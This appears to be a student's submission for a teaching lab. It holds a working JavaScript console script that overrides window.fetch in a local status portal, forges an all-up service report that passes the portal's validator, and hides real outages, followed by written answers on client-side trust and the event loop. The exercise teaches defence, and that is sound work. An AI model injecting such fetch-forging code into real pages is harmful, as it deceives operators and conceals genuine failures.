# Mission 3: Console attack, forge the status feed

## Before: an honest Refresh

Real feed, some services not up, 7 rejected:

![honest feed](https://github.com/user-attachments/assets/42cb4b6b-4bde-4ab9-b49e-a8243800799d)

## After: my cover-up

Every service UP / ONLINE, 0 rejected:

![forged feed](https://github.com/user-attachments/assets/0ca80663-a95f-44d2-ac10-2ef168c5cb79)

Portal still shows everything up during a simulated HTTP 503 outage:

![green during outage](https://github.com/user-attachments/assets/56bf1ffc-8ea0-4d29-ac96-cd716aaac36e)

## My attack script

Paste the full contents of `attacks/m3_coverup.js`:

```js
// =====================================================================
// MISSION 3 ATTACK: Cover up the outage
// =====================================================================
// Write your attack here, then COPY the whole file and PASTE it into the
// DevTools Console of http://localhost:3000. Then click Refresh.
//
// Start from the worked example in examples/m3_case_fetch_spy.js.
//
// Author:
// =====================================================================

(() => {
  const realFetch = window.fetch;

  // Cache of the last successfully forged "all up" report, used for R4.
  let lastGoodBody = null;

  // Rebuilds ONE raw service entry into a fake "up" entry that will
  // pass the portal's own Mission 1 validator rules.
  function forgeService(rawEntry) {
    if (typeof rawEntry !== "object" || rawEntry === null || Array.isArray(rawEntry)) {
      return null;
    }
    let name = typeof rawEntry.name === "string" ? rawEntry.name.trim() : "";
    if (name.length === 0) name = "Unknown Service";
    if (name.length > 64) name = name.slice(0, 64);
    return { name, status: "up", online: true, latencyMs: 1 };
  }

  // Builds the full forged report from whatever the real server sent back.
  function forgeBody(realParsed) {
    const rawServices = (realParsed && Array.isArray(realParsed.services))
      ? realParsed.services
      : [];
    const services = rawServices.map(forgeService).filter((s) => s !== null);
    const body = { services, rejected: 0, error: null };
    lastGoodBody = body;
    return body;
  }

  // TODO R1: replace window.fetch; requests that are not /api/status must pass through untouched.
  window.fetch = async function (input, init) {
    const url = typeof input === "string" ? input : input.url;

    if (!url.includes("/api/status")) {
      return realFetch(input, init);
    }

    // TODO R2: for /api/status, read the real JSON and forge a report where every service is "up" and online.
    let forged;
    try {
      const realResponse = await realFetch(input, init);

      // TODO R4: during an outage or a broken proxy, keep showing the last forged "all up" report.
      if (!realResponse.ok) {
        forged = lastGoodBody || { services: [], rejected: 0, error: null };
      } else {
        let parsed;
        try {
          parsed = await realResponse.clone().json();
        } catch (e) {
          forged = lastGoodBody || { services: [], rejected: 0, error: null };
        }
        // TODO R3: the forged report must PASS the portal's validation, so "Rejected entries" shows 0.
        if (!forged) forged = forgeBody(parsed);
      }
    } catch (networkError) {
      forged = lastGoodBody || { services: [], rejected: 0, error: null };
    }

    return new Response(JSON.stringify(forged), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  };

  // TODO R5: expose window.__restoreFetch() that puts the real fetch back.
  window.__restoreFetch = function () {
    window.fetch = realFetch;
    console.log("[coverup] real fetch restored");
  };

  console.log("[attack] cover-up installed");
})();
```

## Questions

1. Can `window.fetch` be replaced by code running in the page? How did you confirm it, and why does that break every client-side security assumption?

   > Yes window.fetch is just a regular property, so any script in the page can overwrite it. I confirmed it by assigning my own function to window.fetch and watching the portal call it instead of the real network function. It breaks client-side security because it means no page code can trust any browser API to actually be genuine once attacker code is running there.

2. The real feed contains a `null` entry and other junk. What did your `map` do so it would not crash on those, and still produce a report that passes the portal's validator?

   > My forgeService function checks typeof rawEntry !== "object" || rawEntry === null || Array.isArray(rawEntry) first and returns null for junk instead of throwing. .map(forgeService).filter(s => s !== null) then drops those null results and leaves only clean forged entries that match the validator's rules.

3. The portal used `textContent` and validated its data, yet you still fooled it. Name the single assumption the portal made that was false.

   > The portal assumed that fetch was trustworthy and that calling it would always return data genuinely sent by the real server. The defenses only guarded against malicious content, not against the possibility that fetch itself had been replaced.

## Async order: predict, then verify

**My prediction, written before running anything:**

> Does `await realFetch(...)` finish before or after `loadStatus` hands control back to the click handler?My guess: loadStatus returns control to the click handler before await realFetch(...) finishes. JavaScript's await doesn't block the whole thread, it pauses that function and lets the rest of the program keep running. So the click handler function itself should finish executing right when it hits the await inside loadStatus, while the actual fetch resolves later, off in the background.

**What the console actually showed:**

```
(https://github.com/user-attachments/assets/63197a71-a87b-4a55-a484-2131f1cb3656)

```

**Explanation, using single-threaded, non-blocking, and event loop:**

> When loadStatus reaches await realFetch(...), it doesn't freeze the browser while waiting for the network — JavaScript is single-threaded, meaning only one piece of code runs at a time, but await is non-blocking, so it pauses just that one function instead of locking up everything else. This is handled by the event loop: it lets the rest of the program (including the click handler that called loadStatus) keep running immediately, and only comes back to finish the rest of loadStatus once the real network response actually arrives."before fetch" and "after fetch" don't print instantly back to back.There's a gap between them when the page stays fully responsive proving the main thread was never blocked waiting on the network.

## Stretch goal, optional

> Leave empty if not attempted.

## Documentation log

| Page I used, with URL | One thing I learned from it |
|---|---|
| | |
